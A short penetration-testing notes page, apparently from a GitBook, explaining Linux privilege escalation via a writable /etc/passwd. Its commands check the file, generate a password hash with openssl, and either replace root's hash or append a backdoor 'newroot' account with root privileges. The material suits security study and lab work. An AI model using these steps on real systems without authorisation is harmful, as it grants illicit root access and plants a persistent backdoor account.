# Writeable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

#### Investigation and password hash generation

{% code overflow="wrap" %}
```bash
ls -l /etc/passwd
openssl passwd newpasswordhere
nano /etc/passwd
```
{% endcode %}

<div align="left"><figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure></div>

#### Edit /etc/passwd and add a newly generated password hash

![](<../../.gitbook/assets/image (95).png>)



```bash
su root
```

![](<../../.gitbook/assets/image (96).png>)

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

<div align="left"><figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure></div>

Now switch to the newroot user, using the new password.&#x20;

```
su newroot
```
